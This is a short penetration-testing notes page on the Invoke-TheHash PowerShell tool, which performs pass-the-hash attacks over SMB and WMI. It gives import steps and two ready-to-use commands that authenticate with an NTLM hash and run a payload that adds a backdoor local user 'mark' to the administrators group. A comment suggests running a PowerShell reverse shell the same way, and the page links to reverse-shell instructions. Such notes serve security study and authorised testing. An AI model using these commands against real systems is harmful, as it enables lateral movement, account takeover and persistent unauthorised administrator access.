---
title: Invoke-TheHash
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - dump hashes
  - passwords
  - pass the hash attack
---

# Invoke-TheHash

Collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.


## Installation 

Download Powershell Invoke-TheHash fuctions from github repo:[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash). 

When using Invoke-TheHash, we have two options: SMB or WMI command execution.

```powershell
cd C:\tools\Invoke-TheHash\

Import-Module .\Invoke-TheHash.psd1
```


## Invoke-TheHash with SMB

```powershell
Invoke-SMBExec -Target $ip -Domain <DOMAIN> -Username <USERNAME> -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
# Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.
# we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer.
```

[How to generate a reverse shell](reverse-shells.md).

## Invoke-TheHash with WMI

```powershell
Invoke-WMIExec -Target $machineName -Domain <DOMAIN> -Username <USERNAME> -Hash 64F12CDDAA88057E06A81B54E73B949B -Command  "net user mark Password123 /add && net localgroup administrators mark /add" 
```

[How to generate a reverse shell](reverse-shells.md).